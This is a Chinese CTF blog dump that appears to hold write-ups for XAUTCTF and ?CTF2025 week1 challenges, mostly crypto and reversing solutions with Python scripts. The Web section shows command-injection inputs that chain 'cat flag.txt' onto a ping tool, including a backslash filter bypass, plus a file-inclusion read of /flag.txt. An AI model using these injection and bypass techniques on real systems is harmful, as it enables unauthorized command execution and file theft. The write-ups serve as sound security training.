3319022875033974423964187739917595278427184197383708001806576530909609086508041781233603918453326670975069669017566120311964861589659101428987255146018427decrypt(p, q, e, c)# XAUTCTF&#123;e_1s_n0t_@_Prime&#125; Close Enough 题目描述：听说 RSA 非常安全？可是如果两个质数选得“太接近”，结果会怎样呢？ 打开附件， from Crypto.Util.number import getPrime, bytes_to_long, isPrime, inverse//找到大于n的最大素数def nextprime(n): n += 1 while not isPrime(n): n += 1 return nflag = &quot;&quot;e = 65537p = getPrime(512)q = nextprime(p + (1 &lt;&lt; 20))n = p * qphi = (p - 1) * (q - 1)d = inverse(e, phi)m = bytes_to_long(bytes(flag, &#x27;utf-8&#x27;))c = pow(m, e, n)print(&quot;n =&quot;, n)print(&quot;c =&quot;, c)&#x27;&#x27;&#x27;n = 123396213393166669967180741417142386608199293295343396860771048265983027294499309946576382614888097841439905355747919662299668639065387197060901118151079928153661471067906790612624750455011912757452786783406975664690965235505528837643347037179762435944987875469138529309017524600020070268892228090521628748157c = 96164959972807254618417630680358223130932461911993510788732180904733021127322517962027522173599694137945712716717847174536035583857007099675639087774330478493529755676338936283880541666682835088571888431839407259147158612358623749706985446040831405827991266588402528874606153834653456725906949141238839683080&#x27;&#x27;&#x27; 我们知道了n、c和e，通过nextprime函数和p、q的设定得知q是p+2^20之后的一个大素数，鉴于生成的素数都很大，所以该题中p和q相差不大。 在这里，我们有两种思路： 费马分解：我们知道了n = p*q后，设： a = (p+q)/2b = (q-p)/2得 n = (a+b)(a-b) = a^2-b^2 本题，p和q接近，可以从ceil(sqrt(n))将n开方后尝试a，直至a^2-n为完全平方数 基于偏移量的暴力搜索(逼近)： 我们知道了q = p +2^20，则n = p*q = p*(p +2^20) = p^2 + 2^20 * p 则p^2 + 2^20 * p - n也就约等于0了，解方程式得p。 知道了p，也就知道了q，之后就是RSA的常规操作了。 所以，我们解密该RSA的核心思路就是通过p^2 + 2^20 * p - n解方程得到p的大概值，从其前后各试多个数，从是不是素数、q_ca = p+2^20大的下一个素数、p*q_ca是不是为n几个方面猜测，循环直至得到找到p和q。通过数学估算+暴力逼近解密RSA。 EXP： from math import isqrtfrom Crypto.Util.number import isPrime, inverse, long_to_bytesn = 123396213393166669967180741417142386608199293295343396860771048265983027294499309946576382614888097841439905355747919662299668639065387197060901118151079928153661471067906790612624750455011912757452786783406975664690965235505528837643347037179762435944987875469138529309017524600020070268892228090521628748157c = 96164959972807254618417630680358223130932461911993510788732180904733021127322517962027522173599694137945712716717847174536035583857007099675639087774330478493529755676338936283880541666682835088571888431839407259147158612358623749706985446040831405827991266588402528874606153834653456725906949141238839683080e = 65537def nextprime(n): n += 1 while not isPrime(n): n += 1 return x//估算pdelta = 1 &lt;&lt; 20p_guess = (isqrt(4 * n + delta * delta) - delta) // 2//得到大概值后前后数猜测for diff in range(-50000, 50000): p = p_guess + diff if p &lt;= 1: continue if not isPrime(p): continue q = nextprime(p + delta) if p * q == n: breakelse: print(&quot;Failed to find p, q&quot;) exit()phi = (p - 1) * (q - 1)d = inverse(e, phi)m = pow(c, d, n)flag = long_to_bytes(m).decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;)print(&quot;Flag:&quot;, flag)#flag: XAUTCTF&#123;Y0u_c@n_d0_3zzz_rs4!!!&#125; revSignIn 题目描述：来签个到吧！ 什么？你想直接得到flag？ 下载附件，用IDA打开，看到全是密密麻麻的函数肯定不想看下去了吧 直接Ctrl+F12看所有的字符串，得到flag：XAUTCTF{F|rsT_5t3P_} Welcome to Reverse World 题目描述：XAUT网络安全小组的新实验室刚刚上线，传说每一个想要进入实验室的人，必须在入口处输入正确的口令。 然而，这个口令被小组的成员编译进了一段神秘程序中。 想要成为实验室的新成员，你必须通过逆向分析，找出正确的通关口令！ 程序已经为你准备好，快来试试吧！ 下载附件，用IDA打开，查看字符串，很遗憾，你被骗了 T_T 本题有两种解法：直接用strings看&#x2F;将十六进制转换 第一种转换：进入main函数， v6数组存储的字符串就是加密后的flag,即 xmmword_2080、xmmword_2090、xmmword_20A0。 单击进入，得到小端序的flag十六进制字节： 我们把这些数值反转，再转换为ASCII字符， 得到flag：XAUTCTF{W3c0me_T0_tH3_w0r1d_oF_R3verSe_3nGineErin9!!!} 第二种直接strings命令：在命令行输入strings welcome_rev，即可得到flag。 你喜欢贝斯吗 题目描述：听说贝斯蛮好听的，一起来听吧！ 下载附件。在IDA中打开， 一样的，查看字符串，看到一串奇怪的字符串WEFVVENURntTM2MwbkRfOUhhczNffQ==， 后面有两个=的一定是base64编码，一个=的一般是base32编码， 我们放到解码模块里得到flag：XAUTCTF{S3c0nD_9Has3_} base_revenge 题目描述：base reunion IDA中打开，查看main函数，代码逻辑为用base58字母表加密base64表，然后再用解密后的base64表去加密flag，得到密文。 知道了逻辑，只需找到对应的字符串即可， 先用base58标准字母表解密base64加密表(注意，上下两个字符串都是表，base64表为64个字符)得ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ 再用解密后的表解密密文得到flag：XAUTCTF{|_|nu5U@L_b@sE} Eeeeazy 题目描述：can u find me??? 得到的flag用XAUTCTF{}包裹提交 ​ hint：涉及动态调试，可参考IDA使用技巧之动态调试 IDA打开，定位_main函数，打开： __main(); time(&amp;Time); v5 = localtime(&amp;Time); puts(&quot;Can you find me?\\n&quot;); system(&quot;pause&quot;); return 0;&#125; 没啥好看的，继续看可疑函数，找到了_ques函数： v3 = 2147122737; v4[0] = 140540; v4[1] = -2008399303; v4[2] = 141956; v4[3] = 139457077; v4[4] = 262023; v4[5] = -2008923597; v4[6] = 143749; v4[7] = 2118271985; v4[8] = 143868; for ( i = 0; i &lt;= 4; ++i ) &#123; memset(v2, 0, sizeof(v2)); v8 = 0; v7 = 0; v0 = v4[2 * i]; LODWORD(v6) = v4[2 * i - 1]; HIDWORD(v6) = v0; while ( v6 &gt; 0 ) &#123; v2[v8++] = v6 % 2; v6 /= 2LL; &#125; for ( j = 50; j &gt;= 0; --j ) &#123; if ( v2[j] ) &#123; if ( v2[j] == 1 ) &#123; putchar(42); ++v7; &#125; &#125; else &#123; putchar(32); ++v7; &#125; if ( !(v7 % 5) ) putchar(32); &#125; result = putchar(10); &#125; return result;&#125; 很明显是一个加密函数，你可以选择解密这一段代码，逻辑是将v4数组的奇数索引的值作为低位，偶数为高位，一起组成一个64位的整数v6，以二进制位图打印出图形。 v4 = [140540,-2008399303,141956,139457077,262023,-2008923597,143749,2118271985]for i in range(4): n = ((v4[i*2] &amp; 0xFFFFFFFF) &lt;&lt; 32) | (v4[i*2+1] &amp; 0xFFFFFFFF) print(&#x27;&#x27;.join(&#x27; *&#x27;[((n &gt;&gt; (49-j)) &amp; 1)] + &#x27; &#x27;*(j%5==4) for j in range(50))) 运行看到flag为 HACKIT4FUN ： 但本题真正考察IDA的动态调试。 通过看该附件的_main函数汇编代码，，在0x401773下断点，让我们能在main函数执行完成前暂停程序； 然后，再看_ques函数，先记下_ques开始的位置0x401520，这里汇编语言中pop ebp即为将把基址指针寄存器弹出堆栈，也就是将我们之前所说的 v6 所包含的值剥开来，呈现在命令行里。所以，我们要想在运行时得到位图，就得在pop这儿下断点，即0x401723，方便查看最终的flag。 我们运行程序，来到该界面： 将General registers里0x0401773修改EIP为刚刚我们记下的_ques开始的位置0x0401520，然后点击继续运行，即可得到二进制位图flag XAUTCTF{HACKIT4FUN} ： 糖衣炸弹 题目描述：听说每一位新成员都会得到一颗SS-Team定制糖果吗？ ​ 真的有那么善良吗？ ​ “不要随便吃糖，有毒咋办？”妈妈说。 ​ hint：U konw Packed Xanadu?(用UPX脱壳) 下载附件，先查查有无加壳，放到Exeinfo里查壳，，得到有UPX的壳。 于是，我们到upx指定目录下，运行./upx -d candy.exe给其脱壳(关于UPX相关介绍)， 然后再IDA打开，定位到主函数(这里不是main)： v7 = __readfsqword(0x28u); sub_405450(&quot;Welcome to XAUT simple XOR crackme!&quot;); sub_405450(&quot;Enter the secret code to reveal the flag:&quot;); if ( sub_4050B0(v6, 64LL, off_4B06D8) ) &#123; v6[sub_401140(v6, &quot;\\r\\n&quot;)] = 0; if ( (unsigned int)sub_401A90(v6) ) &#123; *(__m128i *)v5 = _mm_load_si128((const __m128i *)&amp;xmmword_48AA40); *(__m128i *)&amp;v5[9] = _mm_load_si128((const __m128i *)&amp;xmmword_48AA50); v0 = sub_4108A0(26LL); if ( v0 ) &#123; for ( i = 0LL; i != 25; ++i ) *(_BYTE *)(v0 + i) = v5[i] ^ 0x5A; *(_BYTE *)(v0 + 25) = 0; sub_41BFA0(2, (unsigned int)&quot;Good job! The flag is:\\n%s\\n&quot;, v0, (unsigned int)v5, v1, v2, v5[0]); sub_410FB0(v0); &#125; &#125; else &#123; sub_405450(&quot;Wrong secret. Try reversing the binary!&quot;); &#125; &#125; if ( v7 != __readfsqword(0x28u) ) sub_41C070(); return 0LL;&#125; 将xmmword_48AA40和xmmword_48AA50里的数据存入v5里，再进行异或操作得到密文，我们要做的是把密文异或回去 明文 ^ key = 密文，即 密文 ^ key = 明文，这里key为0x5A。 最后的EXP： enc_flag = [2, 27, 15, 14, 25, 14, 28, 33, 3, 106, 47, 5, 61, 106, 14, 5, 105, 44, 51, 22, 5, 47, 10, 34, 39]key = 0x5Aplain = &#x27;&#x27;.join(chr(i ^ key) for i in enc_flag)print(&quot;Decrypted flag:&quot;, plain)#flag：XAUTCTF&#123;Y0u_g0T_3viL_uPx&#125;","categories":[{"name":"CTF相关","slug":"CTF相关","permalink":"https://incldue.github.io/categories/CTF%E7%9B%B8%E5%85%B3/"}],"tags":[{"name":"比赛个人WP","slug":"比赛个人WP","permalink":"https://incldue.github.io/tags/%E6%AF%94%E8%B5%9B%E4%B8%AA%E4%BA%BAWP/"}]},{"title":"?CTF2025 week1部分WP","slug":"iloveCTF 2025 部分题WP","date":"2025-10-17T16:00:00.000Z","updated":"2025-11-01T15:54:01.193Z","comments":true,"path":"2025/10/18/iloveCTF 2025 部分题WP/","permalink":"https://incldue.github.io/2025/10/18/iloveCTF%202025%20%E9%83%A8%E5%88%86%E9%A2%98WP/","excerpt":"这次打了?CTF,week1只拿了前20，唉~","text":"Crypto[Week1] Basic Number theory 题目描述：数论并非那么简单… 下载附件并打开： from Crypto.Util.number import *from secret import flagdef gift(m, prime): return pow(m, (prime + 1) // 2, prime)m = bytes_to_long(flag)p = getPrime(256)q = getPrime(256)print(f&#x27;p = &#123;p&#125;&#x27;)print(f&#x27;q = &#123;q&#125;&#x27;)print(f&#x27;gift1 = &#123;gift(m, p)&#125;&#x27;)print(f&#x27;gift2 = &#123;gift(m, q)&#125;&#x27;)# p = 71380997427449345634700552609577271052193856747526826598031269184817312570231# q = 65531748297495117965939047069388412545623909154912018722160805504300279801251# gift1 = 40365143212042701723922505647865230754866250738391105510918441288000789123995# gift2 = 10698628345523517254945893573969253712072344217500232111817321788145975103342 可以知道，gift=m^[(p+1)/2]=m*(m|p)(mod p)，也就是gift=±m (mod p) 想到用CRT将gift1和gift2分别两种组合，一共四种组合合并为4个整数，并检验是否含有flag&#123;&#125; EXP： from Crypto.Util.number import long_to_bytesp = 71380997427449345634700552609577271052193856747526826598031269184817312570231q = 65531748297495117965939047069388412545623909154912018722160805504300279801251gift1 = 40365143212042701723922505647865230754866250738391105510918441288000789123995gift2 = 10698628345523517254945893573969253712072344217500232111817321788145975103342n = p * qdef crt(a1, n1, a2, n2): inv = pow(n1, -1, n2) k = ((a2 - a1) * inv) % n2 x = a1 + n1 * k return xdef is_printable_ascii(bs): if len(bs) == 0: return False return all(32 &lt;= b &lt; 127 for b in bs)candidates = []for s1 in (1, -1): r1 = (s1 * gift1) % p for s2 in (1, -1): r2 = (s2 * gift2) % q x = crt(r1, p, r2, q) candidates.append(x)seen = set()for idx, x in enumerate(candidates): if x in seen: continue seen.add(x) bs = long_to_bytes(x) try: txt = bs.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;) except: txt = repr(bs) good = False if txt.startswith(&quot;flag&#123;&quot;) or txt.startswith(&quot;FLAG&#123;&quot;) or &quot;flag&#123;&quot; in txt: good = True if is_printable_ascii(bs): good = True print(f&quot;--- candidate #&#123;idx+1&#125; ---&quot;) print(f&quot;int (hex): &#123;hex(x)&#125;&quot;) print(f&quot;bytes len: &#123;len(bs)&#125;&quot;) if good: print(&quot;decoded (likely):&quot;, txt) else: preview = txt[:200] + (&quot;...&quot; if len(txt) &gt; 200 else &quot;&quot;) print(&quot;decoded (preview):&quot;, preview) print() #flag：flag&#123;Th3_c0rner5t0ne_0f_C2ypt0gr@phy&#125; [Week1] Strange Machine 题目描述：nc连接 要连靶机，先看给的附件： from secret import msg_len, offset, plaintextfrom Crypto.Util.number import long_to_bytesfrom random import randbytesfrom base64 import b64encodefrom pwn import xorimport osflag = os.getenv(&#x27;FLAG&#x27;)def banner(): print(&quot;你发现了一个奇怪的机器，它对你的消息进行了加密。&quot;) print(&quot;你截获了这个机器第一次的密文，同时可以继续使用该机器进行加密。&quot;) print(&quot;注意:所有密文输出都经过 base64 编码，方便你复制分析。\\n&quot;)def menu(): print(f&quot;1. 加密消息&quot;) print(f&quot;2. 校验明文是否正确&quot;) print(f&quot;3. 退出&quot;)class Key: def __init__(self): self.seed = randbytes(msg_len) def generate(self): self.seed = self.seed[offset:] + self.seed[:offset] return self.seeddef pad(msg): pad_len = msg_len - len(msg) return msg + pad_len * long_to_bytes(pad_len)def encrypt(msg, key): cipher = xor(pad(msg), key) return b64encode(cipher)def main(): banner() key = Key() cur_key = key.generate() cipher1 = encrypt(plaintext, cur_key) print(f&#x27;[*] 首次密文(base64):&#123;cipher1&#125;\\n&#x27;) while True: try: menu() choice = int(input(f&quot;[?] 请输入你的选择:&quot;)) if choice == 1: msg = input(f&quot;[?] 请输入要加密的消息(长度小于等于&#123;msg_len&#125;): &quot;).encode() if len(msg) &gt; msg_len: print(f&quot;[!] 输入消息过长，最长为 &#123;msg_len&#125; 字节\\n&quot;) continue cur_key = key.generate() cipher = encrypt(msg, cur_key) print(f&quot;[*] 你的消息已加密(密文): &#123;cipher&#125;\\n&quot;) continue if choice == 2: msg = input(f&quot;[?] 请输入待校验的明文: &quot;).encode() if msg == plaintext: print(f&quot;[*] 这是你的flag: &#123;flag&#125;\\n&quot;) break print(&quot;[!] 校验错误!\\n&quot;) continue if choice == 3: print(&quot;再见~\\n&quot;) break print(&quot;[!] 无效输入\\n&quot;) except Exception: print(&quot;[!] 出现错误!\\n&quot;) breakif __name__ == &quot;__main__&quot;: main() 可以知道，只要任意调用菜单1的一次加密，且所提交的明文字符串长度恰好是msg_len，则返回的密文就是完整的此次密钥流。之后，则按照旋转量反推出seed，再算第一次被用来生成cipher1的密钥，经过XOR得到明文。 接下来，nc连接靶机，得到第一次的base64密文： 选择选项1，输入16位字符串(我这里输入16位A)，得到第二次密文： EXP： import base64C1_b64 = &quot;6Asv1s203wj+QtckNNfQXw==&quot;C_oracle_b64 = &quot;HOKwH+YiQu7jgL4v1m3yRQ==&quot;msg_len = 16def bxor(a,b): return bytes(x^y for x,y in zip(a,b))def rot_left(bs,r): n=len(bs); r%=n return bs[r:]+bs[:r]def rot_right(bs,r): n=len(bs); r%=n return bs[-r:]+bs[:-r] if r!=0 else bsdef unpad_pk_like(data): if len(data)==0: return None last = data[-1] if last==0 or last&gt;len(data): return None if data[-last:]==bytes([last])*last: return data[:-last] return Nonec1 = base64.b64decode(C1_b64)cor = base64.b64decode(C_oracle_b64)P0 = b&quot;A&quot;*msg_lenkey_oracle = bxor(cor, P0)for offset in range(msg_len): r = (2*offset) % msg_len seed = rot_right(key_oracle, r) key_initial = rot_left(seed, offset) padded = bxor(c1, key_initial) plain = unpad_pk_like(padded) if plain is not None: print(&quot;found offset =&quot;, offset) print(&quot;plaintext =&quot;, plain) break# found offset = 12# plaintext = b&#x27;Oh,you find it!&#x27; 选择选择2，输入明文进行校验，即可得到flag：flag{477fa58d-588e-448e-83b5-a737a1f652ed} [Week1] beyondHex 题目描述：质疑，理解，成为！ 下载附件，得到： 这是什么东西？ 807G6F429C7FA2200F46525G1350AB20G339D2GB7D8 因为不太晓得这个编码，丢到GPT里，知道是用17进制表示的整数字符串，要将其当成一个以17为基数的大整数，再转成字节，即可得到flag。 要将每个字符按0..9,A..F,G --&gt;0..16解析为base17，然后写为大端字节 EXP： s = &quot;807G6F429C7FA2200F46525G1350AB20G339D2GB7D8&quot;# 基数为17，字符集 0-9,A-G (G 表示 16)digits = &#123;c: i for i, c in enumerate(&quot;0123456789ABCDEFG&quot;)&#125;val = 0for ch in s: val = val * 17 + digits[ch.upper()] b = val.to_bytes((val.bit_length() + 7) // 8, &#x27;big&#x27;)print(b.decode())# flag：flag&#123;welc0me_t0_?CTF!&#125; [Week1] two Es 题目描述：two Es, too Ez! 打开附件： from Crypto.Util.number import *import randomfrom secret import flagp, q = getPrime(512), getPrime(512)n = p * qe1 = random.getrandbits(32)e2 = random.getrandbits(32)m = bytes_to_long(flag)c1 = pow(m, e1, n)c2 = pow(m, e2, n)print(f&#x27;&#123;n = &#125;&#x27;)print(f&#x27;&#123;e1 = &#125;&#x27;)print(f&#x27;&#123;e2 = &#125;&#x27;)print(f&#x27;&#123;c1 = &#125;&#x27;)print(f&#x27;&#123;c2 = &#125;&#x27;)&#x27;&#x27;&#x27;n = 118951231851047571559217335117170383889369241506334435506974203511684612137655707364175506626353185266191175920454931743776877868558249224244622243762576178613428854425451444084313631798543697941971483572795632393388563520060136915983419489153783614798844426447471675798105689571205618922034550157013396634443e1 = 2819786085e2 = 4203935931c1 = 104852820628577684483432698430994392212341947538062367608937715761740532036933756841425619664673877530891898779701009843985308556306656168566466318961463247186202599188026358282735716902987474154862267239716349298652942506512193240265260314062483869461033708176350145497191865168924825426478400584516421567974c2 = 43118977673121220602933248973628727040318421596869003196014836853751584691920445952955467668612608693138227541764934104815818143729167823177291260165694321278079072309885687887255739841571920269405948846600660240154954071184064262133096801059918060973055211029726526524241753473771587909852399763354060832968&#x27;&#x27;&#x27; 得到，有e1和e2，以及对应的c1和c2。 为同一明文m用相同模n、两不同指数e1,e2，得c1=m^&#123;e1&#125; mod n和c2=m^&#123;e2&#125; mod n。 若g = gcd(e1,e2) == 1，可用扩欧算法出s,t，使s*e1 + t*e2 = 1，得m=c1^s * c2^t (mod n) 若g = gcd(e1,e2) &gt; 1，先得到m^g (mod n)，并尝试直接对其求整数g次根。 EXP： from Crypto.Util.number import long_to_bytes, inversefrom math import gcdn = 118951231851047571559217335117170383889369241506334435506974203511684612137655707364175506626353185266191175920454931743776877868558249224244622243762576178613428854425451444084313631798543697941971483572795632393388563520060136915983419489153783614798844426447471675798105689571205618922034550157013396634443e1 = 2819786085e2 = 4203935931c1 = 104852820628577684483432698430994392212341947538062367608937715761740532036933756841425619664673877530891898779701009843985308556306656168566466318961463247186202599188026358282735716902987474154862267239716349298652942506512193240265260314062483869461033708176350145497191865168924825426478400584516421567974c2 = 43118977673121220602933248973628727040318421596869003196014836853751584691920445952955467668612608693138227541764934104815818143729167823177291260165694321278079072309885687887255739841571920269405948846600660240154954071184064262133096801059918060973055211029726526524241753473771587909852399763354060832968def xgcd(a, b): x0, x1, y0, y1 = 1, 0, 0, 1 while b: q, a, b = a // b, b, a % b x0, x1 = x1, x0 - q * x1 y0, y1 = y1, y0 - q * y1 return a, x0, y0def mod_pow_with_neg(base, exp, mod): if exp &gt;= 0: return pow(base, exp, mod) inv = inverse(base, mod) if inv is None: raise ValueError(&quot;base has no inverse mod n (gcd != 1)&quot;) return pow(inv, -exp, mod)def integer_nth_root(a, n): if a &lt; 0: return None, False if a == 0: return 0, True # 二分法 low = 1 high = 1 &lt;&lt; ((a.bit_length() + n - 1) // n + 1) while low + 1 &lt; high: mid = (low + high) // 2 p = mid ** n if p == a: return mid, True if p &lt; a: low = mid else: high = mid return low, low**n == adef try_recover(n, e1, e2, c1, c2, try_k_limit=2000): g = gcd(e1, e2) if g == 1: # 直接用扩展欧几里得 g0, s, t = xgcd(e1, e2) assert g0 == 1 # m = c1^s * c2^t mod n part1 = mod_pow_with_neg(c1, s, n) part2 = mod_pow_with_neg(c2, t, n) m = (part1 * part2) % n return m, 1 # 返回 m 和 g=1 else: # g &gt; 1: 先得到 m^g (模 n) e1p = e1 // g e2p = e2 // g g0, s, t = xgcd(e1p, e2p) assert g0 == 1 # (c1)^s * (c2)^t ≡ m^&#123;g&#125; (mod n) part1 = mod_pow_with_neg(c1, s, n) part2 = mod_pow_with_neg(c2, t, n) mg_mod = (part1 * part2) % n # 这是 m^g (mod n) # 尝试直接把 mg_mod 当作整数 m^g（成立当 m^g &lt; n） root, exact = integer_nth_root(mg_mod, g) if exact: return root, g # 否则尝试 mg_mod + k*n（k 从 0 开始）寻找整数 g 次方 for k in range(1, try_k_limit + 1): val = mg_mod + k * n root, exact = integer_nth_root(val, g) if exact: return root, g # 若都失败，返回 (None, g) return None, gif __name__ == &quot;__main__&quot;: recovered, g = try_recover(n, e1, e2, c1, c2, try_k_limit=10000) if recovered is None: print(&quot;无法直接恢复明文。可能需要更大范围枚举 k（尝试 mg + k*n），或 p/q 因子信息。&quot;) print(&quot;gcd(e1,e2) =&quot;, gcd(e1, e2)) else: print(&quot;Recovered g =&quot;, g) try: txt = long_to_bytes(recovered).decode() except Exception: txt = repr(long_to_bytes(recovered)) print(&quot;Recovered message (decoded if possible):&quot;) print(txt)# flag：flag&#123;s01v3_rO0T_bY_7he_S4mE_m0dU1u5&#125; MISC[Week1] 《关于我穿越到CTF的异世界这档事:序》 题目描述：metavi正在深夜刷题，屏幕突然弹出计算器窗口，紧接着浮现一句话：【”即使引导早已破碎，也请您当上MISC之王。”】一阵强光过后，他已然站在一片不可思议的大陆上，NPC告诉他，这里是“异世界·Misc大陆”，而他是被召唤来的挑战者。他被选中代表“Misc分域”挑战其他技术领域，否则 Misc 将被系统删除。挑战形式则是一道道Misc题的具象化场景。为了Misc也为了自己，metavi不得不接受挑战。【第一层·base：请解出隐藏在base里的flag。】 下载附件，有两个文件： alphabet.txt：VGhlIGtleSBoYXMgbmV2ZXIgYmVlbiBmYXIgYXdheTsgaXTgbGllcyBwZWFjZWZ1bGx5IHdpdGhpbiB0aGUgdGV4dCBpdHNlbGYuDT==VGhlIGtleSBoYXMgbmV2ZXIgYmVlbiBmYXIgYXdheTsgaXfgbGllcyBwZWFjZWZ1bGx5IHdpdGhpbiB0aGUgdGV4dCBpdHNlbGYuDf==VGhlIGtleSBoYXMgbmV2ZXIgYmVlbiBmYXIgYXdheTsgaXUgbGllcyBwZWFjZWZ1bGx5IHdpdGhpbiB0aGUgdGV4dCBpdHNlbGYuDU==VGhlIGtleSBoYXMgbmV2ZXIgYmVlbiBmYXIgYXdheTsgaXTgbGllcyBwZWFjZWZ1bGx5IHdpdGhpbiB0aGUgdGV4dCBpdHNlbGYuDT==VGhlIGtleSBoYXMgbmV2ZXIgYmVlbiBmYXIgYXdheTsgaXVgbGllcyBwZWFjZWZ1bGx5IHdpdGhpbiB0aGUgdGV4dCBpdHNlbGYuDV==VGhlIGtleSBoYXMgbmV2ZXIgYmVlbiBmYXIgYXdheTsgaXUgbGllcyBwZWFjZWZ1bGx5IHdpdGhpbiB0aGUgdGV4dCBpdHNlbGYuDU==VGhlIGtleSBoYXMgbmV2ZXIgYmVlbiBmYXIgYXdheTsgaXUgbGllcyBwZWFjZWZ1bGx5IHdpdGhpbiB0aGUgdGV4dCBpdHNlbGYuDU==VGhlIGtleSBoYXMgbmV2ZXIgYmVlbiBmYXIgYXdheTsgaXWgbGllcyBwZWFjZWZ1bGx5IHdpdGhpbiB0aGUgdGV4dCBpdHNlbGYuDW==VGhlIGtleSBoYXMgbmV2ZXIgYmVlbiBmYXIgYXdheTsgaXWgbGllcyBwZWFjZWZ1bGx5IHdpdGhpbiB0aGUgdGV4dCBpdHNlbGYuDW==VGhlIGtleSBoYXMgbmV2ZXIgYmVlbiBmYXIgYXdheTsgaXdgbGllcyBwZWFjZWZ1bGx5IHdpdGhpbiB0aGUgdGV4dCBpdHNlbGYuDd==VGhlIGtleSBoYXMgbmV2ZXIgYmVlbiBmYXIgYXdheTsgaXWgbGllcyBwZWFjZWZ1bGx5IHdpdGhpbiB0aGUgdGV4dCBpdHNlbGYuDW==VGhlIGtleSBoYXMgbmV2ZXIgYmVlbiBmYXIgYXdheTsgaXZgbGllcyBwZWFjZWZ1bGx5IHdpdGhpbiB0aGUgdGV4dCBpdHNlbGYuDZ==VGhlIGtleSBoYXMgbmV2ZXIgYmVlbiBmYXIgYXdheTsgaXXgbGllcyBwZWFjZWZ1bGx5IHdpdGhpbiB0aGUgdGV4dCBpdHNlbGYuDX==VGhlIGtleSBoYXMgbmV2ZXIgYmVlbiBmYXIgYXdheTsgaXTgbGllcyBwZWFjZWZ1bGx5IHdpdGhpbiB0aGUgdGV4dCBpdHNlbGYuDT==VGhlIGtleSBoYXMgbmV2ZXIgYmVlbiBmYXIgYXdheTsgaXWgbGllcyBwZWFjZWZ1bGx5IHdpdGhpbiB0aGUgdGV4dCBpdHNlbGYuDW==VGhlIGtleSBoYXMgbmV2ZXIgYmVlbiBmYXIgYXdheTsgaXTgbGllcyBwZWFjZWZ1bGx5IHdpdGhpbiB0aGUgdGV4dCBpdHNlbGYuDT==VGhlIGtleSBoYXMgbmV2ZXIgYmVlbiBmYXIgYXdheTsgaXQgbGllcyBwZWFjZWZ1bGx5IHdpdGhpbiB0aGUgdGV4dCBpdHNlbGYu 和base8.txt： Tsmssic?FT?ii?sFFi?iTimCTC?mcCmsTiTmmCCCFs?sCCiiTFTcmCmFTCscFicTTs?ciC?TFFTim?s?TTmsmCmFCmmiFCmsTFTimCCsFCmiTicTT?msFCTTTs?c??ssFCmi?mciCcT===== 把alphabet.txt里的文件放到PuzzleSolver里得到base64隐写?CTFmisc， 随后将字符串视为0..7，穷举映射为3位二进制，按8位分组得到字节， 最后是base64的ZmxhZ3tUaDNfUHIxbmMxcGwzXzBmX0Jhc2VfMXNfUzBfRXp6fQ==， 得到flag：flag{Th3_Pr1nc1pl3_0f_Base_1s_S0_Ezz} [Week1] 俱乐部之旅(1) - 邀请函 题目描述：一天Tomoki在冲浪的时候，突然收到了一封来自“c5im俱乐部”的邮件，里面是一封俱乐部邀请函，但想要打开邀请函必须先解出附件中的flag…… 下载附件，是压缩包，尝试解压缩发现要密码… 于是第一次尝试暴力破解，无效， 又丢到010Editor里，直接翻到最后，在文件尾看到hint：c5im????，于是 丢到ARCHPR里用已知明文攻击得到压缩包密码：c5im8467。 解压缩后是一个word文件steg.docx，打开发现空白，眼尖地发现一行小字：重要的内容就应该存在备注中 点击”视图”中的”属性”，得到hint： 将备注里的二进制放到cyberchief里，字节长度选择7时得到flag前一半： 尝试把.docx文件解压缩，在word里看到u_f0und_m3文件，得到十六进制字符串：2657656c63306d655f74305f7468335f6335696d5f433175627d 解得flag后一半：&amp;Welc0me_t0_th3_c5im_C1ub} 即可得到完整flag：flag{W0rd_5t3g_is_1z&amp;Welc0me_t0_th3_c5im_C1ub} [Week1] 布豪有黑客(一) 题目描述：c3把心爱的flag藏在了服务器上，但粗心的他好像忘记关闭HTTP服务了，于是黑客成功偷走了c3的flag和解压密码… 下载附件，是流量分析的文件，打开，直接搜索flag，看到有flag.zip和password.txt： 首先知道了flag.zip的密码为?CTF2025,然后尝试提取flag.zip 点中zip文件对应的HTTP流量，右键Media Type，导出分组字节流，得到了flag.zip 在bandizip里打开，看到flag.txt，输入之前得到的密码，即得flag：flag{Wireshark_1s_4wes0m3} [Week1] 文化木的侦探委托(一) 题目描述：文化木是一家仅有一人的灵异侦探所的员工，有一天，她收到了一张奇怪的照片……？ 下载附件，直接丢到随波逐流里一把梭，修复宽高，得到提示： 我在红色通道的第1位,绿色通道的第0位,蓝色通道的第2位藏了一些东西 -- 你能找到吗? 于是打开StegSolve，按照提示操作，得到flag：flag{Please Find_ME} Web[Week1] Ping?? 题目描述：给你一个ping工具，然后狠狠的想办法ping我吧 打开靶机，尝试输入127.0.0.1： 试着用;来进行命令拼接来绕过，输入127.0.0.1;ls，得到 输入127.0.0.1;cat flag.txt，提示输入包含敏感内容，已被过滤！， 尝试用ca\\t f\\lag.txt绕过，拿到flag：flag{91aaaffa-dc90-4b3d-8476-5d0c95c06965} [Week1] from_http 题目描述：从http入门吧~ 打开靶机，简单的HTTP请求头伪造，一路操作，得到flag： [Week1] 包含不明东西的食物？！ 题目描述：将物品投入锅里即可收获神秘礼品😋 打开靶机， 没啥好看的，直接右键看源码： &lt;body&gt; &lt;div class=&quot;card&quot;&gt; &lt;h2&gt;投入食材&lt;/h2&gt; &lt;form action=&quot;./include.php&quot; method=&quot;post&quot; autocomplete=&quot;off&quot;&gt; &lt;div class=&quot;file-label&quot; style=&quot;display: flex; align-items: center; gap: 8px;&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;filename&quot; id=&quot;file-input&quot; placeholder=&quot;请输入食材名（如food1.webp）&quot; required style=&quot;flex: 1; padding: 4px 6px;&quot;&gt; &lt;!--flag在flag.txt中--&gt; &lt;!--大厨会include你输入的内容哦~--&gt; &lt;/div&gt; &lt;br&gt; &lt;button type=&quot;submit&quot;&gt;投入&lt;/button&gt; &lt;/form&gt; &lt;script&gt; const fileInput = document.getElementById(&#x27;file-input&#x27;); const fileNameSpan = document.getElementById(&#x27;file-name&#x27;); fileInput.addEventListener(&#x27;input&#x27;, () =&gt; &#123; if (fileInput.value.trim().length &gt; 0) &#123; fileNameSpan.textContent = fileInput.value.trim(); fileNameSpan.style.color = &#x27;#000&#x27;; &#125;&#125;); &lt;/script&gt;&lt;/div&gt;&lt;/body&gt; 可以知道是文件包含，于是尝试输入/flag.txt，发现： 